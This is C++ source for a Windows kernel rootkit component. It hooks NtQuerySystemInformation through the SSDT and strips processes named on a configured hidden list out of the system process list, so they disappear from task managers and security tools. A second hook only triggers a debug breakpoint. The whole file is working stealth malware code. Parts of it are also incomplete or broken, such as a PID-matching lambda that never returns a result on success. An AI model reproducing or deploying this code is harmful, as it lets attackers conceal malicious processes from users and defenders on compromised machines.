#include "ZwQuerySystemInformationHooks.h"

extern UCHAR* PsGetProcessImageFileName(IN PEPROCESS Process);

BOOL CheckNameInHiddenList(PWCHAR name)
{
    auto NameList = RootkitHooksConfig::getInstance().GetHiddenProcessByNameList();

    auto nameFinder = [&name](ProcessName pn)
    {
        return wcsstr(name, pn.name);
    };

    auto isInNameList = NameList.Contains(nameFinder);

    if (isInNameList)
        return TRUE;    

    auto PIDFinder = [&name](ProcessPID pp)
    {
        PEPROCESS proc;

        auto status =  PsLookupProcessByProcessId((HANDLE)pp.PID, &proc);
        if (!NT_SUCCESS(status))
        {
            return FALSE;
        }
    };

    return FALSE;
}

extern "C"  NTSTATUS NtQuerySystemInformationHook_HideProcess(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{    
    auto hookData = SSDTHookManagaer::getInstance().GetHookByAddres(reinterpret_cast<ULONG_PTR>(&NtQuerySystemInformationHook_HideProcess));
    NT_QUERY_SYSTEM_INFORMATION originalFunc = reinterpret_cast<NT_QUERY_SYSTEM_INFORMATION>(hookData.OriginalFunc);
        
    auto status = originalFunc(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessesAndThreadsInformation)
    {
        SYSTEM_PROCESS* currentProcEntry = ((SYSTEM_PROCESS*)SystemInformation);
        SYSTEM_PROCESS* previousProcEntry = NULL;
        while (currentProcEntry)
        {            
            if (currentProcEntry->ProcessName.Buffer)
            {
                // TODO: list proc
                PEPROCESS proc;
                
                if (CheckNameInHiddenList(currentProcEntry->ProcessName.Buffer))
                {                    
                    if (previousProcEntry)
                    {
                        if (currentProcEntry->NextEntryDelta)
                        {
                            previousProcEntry->NextEntryDelta += currentProcEntry->NextEntryDelta;
                        }
                        else
                        {
                            previousProcEntry->NextEntryDelta = 0;
                        }
                    }
                    else
                    {
                        if (currentProcEntry->NextEntryDelta)
                        {
                            ULONG sizeNext;
                            SYSTEM_PROCESS* next = reinterpret_cast<SYSTEM_PROCESS*>((PBYTE)currentProcEntry + currentProcEntry->NextEntryDelta);

                            next->NextEntryDelta += currentProcEntry->NextEntryDelta;

                            sizeNext = sizeof(SYSTEM_PROCESS) + (sizeof(SYSTEM_THREADS) * (next->ThreadCount - 1));

                            SystemInformation = (PBYTE)SystemInformation + currentProcEntry->NextEntryDelta;

                            memcpy(currentProcEntry, next, sizeNext);
                        }
                        else
                        {
                            memset(currentProcEntry, 0, sizeof(SYSTEM_PROCESS) + (sizeof(SYSTEM_THREADS) * (currentProcEntry->ThreadCount - 1)));
                        }
                    }
                }
            }
            previousProcEntry = currentProcEntry;
            if (currentProcEntry->NextEntryDelta)
            {
                currentProcEntry = reinterpret_cast<SYSTEM_PROCESS*>((PBYTE)currentProcEntry + currentProcEntry->NextEntryDelta);
            }
            else
            {
                currentProcEntry = NULL;
            }
        }
    }
    
    return status;
}

NTSTATUS NtQuerySystemInformationHook_testInf(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    auto hookData = InfHooksManager::getInstance().FindInList(reinterpret_cast<ULONG_PTR>(&NtQuerySystemInformationHook_testInf));
    NT_QUERY_SYSTEM_INFORMATION originalFunc = reinterpret_cast<NT_QUERY_SYSTEM_INFORMATION>(hookData.OriginalFunc);
    DbgBreakPoint();    

    auto status = originalFunc(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    return status;
}
